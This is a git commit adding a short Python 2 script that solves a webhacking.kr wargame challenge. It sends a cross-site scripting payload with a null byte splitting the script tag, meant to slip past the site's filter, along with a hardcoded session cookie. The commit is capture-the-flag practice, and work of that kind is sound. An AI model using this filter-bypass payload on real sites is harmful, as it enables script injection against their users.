7fca1d2a30b9e3c92a0b6b06863260c4567a40b6
bindon <bindon@Creator-Note>
2018-07-29 14:18:52 +0900

    Clear Challenge23

---
+++ Challenge23.py
@@ -0,0 +1,23 @@
+#-*- coding: utf-8 -*-
+import urllib2
+import CookieManager
+
+challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-3/"
+sessionId = "e28ad7cb81a98a13982054373940bf92"
+
+CookieManager.addCookie("PHPSESSID", sessionId)
+    
+parameter = "<s%00cript>alert(1);</script>"
+httpRequest = urllib2.Request(challengeUrl + "?code=" + parameter)
+httpRequest.add_header("Cookie", CookieManager.getCookie())
+
+httpConnection = None
+try:
+    httpConnection = urllib2.urlopen(httpRequest)
+    httpResponse = httpConnection.read()
+    print httpResponse
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
